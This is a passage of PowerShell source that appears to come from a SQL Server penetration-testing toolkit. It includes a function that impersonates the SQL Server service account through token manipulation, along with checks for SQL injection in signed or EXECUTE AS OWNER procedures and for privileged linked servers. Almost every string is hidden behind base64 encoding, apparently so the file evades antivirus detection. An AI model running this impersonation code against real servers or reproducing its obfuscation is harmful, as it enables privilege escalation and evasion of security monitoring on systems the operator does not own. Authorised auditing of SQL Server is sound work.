            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = ''
        $Description   = ''
        $Remediation   = ''
        $Severity      = ''
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "[CurrentCommand] -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = ''
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0ACAATABhAHMAdAAgACgAVAB3AGkAdAB0AGUAcgApACwAIABDAG8AbQBwAGEAbgB5ACAAWQBlAGEAcgA=')))
        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function  Invoke-SQLImpersonateService
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'This can be used to revert to the original Windows user context.')]
        [switch]$Rev2Self,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
    }
    Process
    {
        if($Rev2Self){          
            Invoke-TokenManipulation -RevToSelf | Out-Null
            Return
        }
        if(-not $Instance){
            Write-Verbose "$Instance : No instance provided."
            Return
        }
        $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
        $IsAdmin = Get-SQLLocalAdminCheck
        if($IsAdmin -ne $true){
            write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
            return
        }else{
            write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
        }
        Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
        [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))} | select ServiceProcessId -ExpandProperty ServiceProcessId
        [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))} | select ServiceAccount -ExpandProperty ServiceAccount
        if ($TargetPid -eq 0){
            Write-Verbose -Message "$Instance : No process running for provided instance..."
            return
        }
        Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
        Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
        try{
            ps | ? {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
        }catch{
            $ErrorMessage = $_.Exception.Message
            Write-Verbose -Message "$Instance : Impersonation failed."
            Write-Verbose  -Message " $Instance : $ErrorMessage"
            return
        }  
        Write-Verbose  -Message "$Instance : Done."                    
    }
    End
    {
    }
}
Function Invoke-SQLAuditSQLiSpExecuteAs
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER."
            Return
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAIABTAFEATAAgAEkAbgBqAGUAYwB0AGkAbwBuACAALQAgAEUAWABFAEMAVQBUAEUAIABBAFMAIABPAFcATgBFAFIA')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABhAGYAZgBlAGMAdABlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQAgAGkAcwAgAHUAcwBpAG4AZwAgAGQAeQBuAGEAbQBpAGMAIABTAFEATAAgAGEAbgBkACAAdABoAGUAIAAiAEUAWABFAEMAVQBUAEUAIABBAFMAIABPAFcATgBFAFIAIgAgAGMAbABhAHUAcwBlAC4AIAAgAEEAcwAgAGEAIAByAGUAcwB1AGwAdAAsACAAaQB0ACAAbQBhAHkAIABiAGUAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIAB0AGgAZQAgAHAAcgBvAGMAZQBkAHUAcgBlACAAbwB3AG4AZQByACAAaQBmACAAUwBRAEwAIABpAG4AagBlAGMAdABpAG8AbgAgAGkAcwAgAHAAbwBzAHMAaQBiAGwAZQAuAA==')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAAcABhAHIAYQBtAGUAdABlAHIAaQB6AGUAZAAgAHEAdQBlAHIAaQBlAHMAIABpAG4AcwB0AGUAYQBkACAAbwBmACAAYwBvAG4AYwBhAHQAZQBuAGEAdABlAGQAIABzAHQAcgBpAG4AZwBzACwAIABhAG4AZAAgAHUAcwBlACAAcwBpAGcAbgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAaQBuAHMAdABlAGEAZAAgAG8AZgAgAHQAaABlACAAIgBFAFgARQBDAFUAVABFACAAQQBTACAATwBXAE4ARQBSACIAIABjAGwAYQB1AHMAZQAuAA==')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -Keyword `"EXECUTE AS OWNER`"'"
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGIAbABvAGcALgBuAGUAdABzAHAAaQAuAGMAbwBtAC8AaABhAGMAawBpAG4AZwAtAHMAcQBsAC0AcwBlAHIAdgBlAHIALQBzAHQAbwByAGUAZAAtAHAAcgBvAGMAZQBkAHUAcgBlAHMALQBwAGEAcgB0AC0AMwAtAHMAcQBsAGkALQBhAG4AZAAtAHUAcwBlAHIALQBpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAA==')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $SQLiResults = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Keyword $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQAgAEEAUwAgAE8AVwBOAEUAUgA='))) 
        if($SQLiResults.rows.count -ge 1){
            $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
            $SQLiResults |
            %{
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                $ObjectName = "$DatabaseName.$SchemaName.$ProcedureName"
                $Details =  "The $ObjectName stored procedure is affected."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)        
            }
        }    
        if($Exploit){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditSQLiSpSigned
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login."
            Return
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAIABTAFEATAAgAEkAbgBqAGUAYwB0AGkAbwBuACAALQAgAFMAaQBnAG4AZQBkACAAYgB5ACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAATABvAGcAaQBuAA==')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABhAGYAZgBlAGMAdABlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQAgAGkAcwAgAHUAcwBpAG4AZwAgAGQAeQBuAGEAbQBpAGMAIABTAFEATAAgAGEAbgBkACAAaABhAHMAIABiAGUAZQBuACAAcwBpAGcAbgBlAGQAIABiAHkAIABhACAAYwBlAHIAdABpAGYAaQBjAGEAdABlACAAbABvAGcAaQBuAC4AIAAgAEEAcwAgAGEAIAByAGUAcwB1AGwAdAAsACAAaQB0ACAAbQBhAHkAIABiAGUAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGkAZwBuAGUAcgAgAGkAZgAgAFMAUQBMACAAaQBuAGoAZQBjAHQAaQBvAG4AIABpAHMAIABwAG8AcwBzAGkAYgBsAGUALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAAcABhAHIAYQBtAGUAdABlAHIAaQB6AGUAZAAgAHEAdQBlAHIAaQBlAHMAIABpAG4AcwB0AGUAYQBkACAAbwBmACAAYwBvAG4AYwBhAHQAZQBuAGEAdABlAGQAIABzAHQAcgBpAG4AZwBzAC4A')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -OnlySigned"
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGIAbABvAGcALgBuAGUAdABzAHAAaQAuAGMAbwBtAC8AaABhAGMAawBpAG4AZwAtAHMAcQBsAC0AcwBlAHIAdgBlAHIALQBzAHQAbwByAGUAZAAtAHAAcgBvAGMAZQBkAHUAcgBlAHMALQBwAGEAcgB0AC0AMwAtAHMAcQBsAGkALQBhAG4AZAAtAHUAcwBlAHIALQBpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAA==')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $SQLiResults = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -OnlySig
        if($SQLiResults.rows.count -ge 1){
            $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
            $SQLiResults |
            %{
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                $ObjectName = "$DatabaseName.$SchemaName.$ProcedureName"
                $Details =  "The $ObjectName stored procedure is affected."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)        
            }
        }    
        if($Exploit){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Server Link"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABMAGkAbgBrAGUAZAAgAFMAZQByAHYAZQByAA==')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGUAIABvAHIAIABtAG8AcgBlACAAbABpAG4AawBlAGQAIABzAGUAcgB2AGUAcgBzACAAaQBzACAAcAByAGUAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIABhAGwAdABlAHIAbgBhAHQAaQB2AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB3AGgAaQBjAGgAIABjAG8AdQBsAGQAIABhAGwAbABvAHcAIABhACAAbABlAGEAcwB0ACAAcAByAGkAdgBpAGwAZQBnAGUAIABsAG8AZwBpAG4AIAB0AG8AIABlAHMAYwBhAGwAYQB0AGUAIAB0AGgAZQBpAHIAIABwAHIAaQB2AGkAbABlAGcAZQBzACAAbwBuACAAYQAgAHIAZQBtAG8AdABlACAAcwBlAHIAdgBlAHIALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAGcAdQByAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAbABpAG4AawBzACAAdABvACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAHIAZQBtAG8AdABlACAAcwBlAHIAdgBlAHIAcwAgAHUAcwBpAG4AZwAgAHQAaABlACAAbABvAGcAaQBuACcAcwAgAGMAdQByAHIAZQBuAHQAIABzAGUAYwB1AHIAaQB0AHkAIABjAG8AbgB0AGUAeAB0AC4A')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        if($Username)
        {
        }
        else
        {
        }
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADkAMAA0ADcAOQAuAGEAcwBwAHgA')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $LinkedServers = Get-SQLServerLink -Verbose -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | 
        ? { $_.LocalLogin -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcwAgAFMAZQBsAGYAIABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA'))) -and ([string]$_.RemoteLoginName).Length -ge 1}
        if($LinkedServers)
        {
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $LinkedServers |
            % -Process {
                $Details = 
                $LinkName = $_.DatabaseLinkName
                $LinkUser = $_.RemoteLoginName
                $LinkAccess = $_.is_data_access_enabled
                $ExploitCmd = "Example query: SELECT * FROM OPENQUERY([$LinkName],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')"
                if($LinkUser -and $LinkAccess -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA='))))
                {
                    Write-Verbose -Message "$Instance : - The $LinkName linked server was found configured with the $LinkUser login."
                    $Details = "The SQL Server link $LinkName was found configured with the $LinkUser login."
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No exploitable SQL Server links were found."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function  Invoke-SQLAuditDefaultLoginPw
{
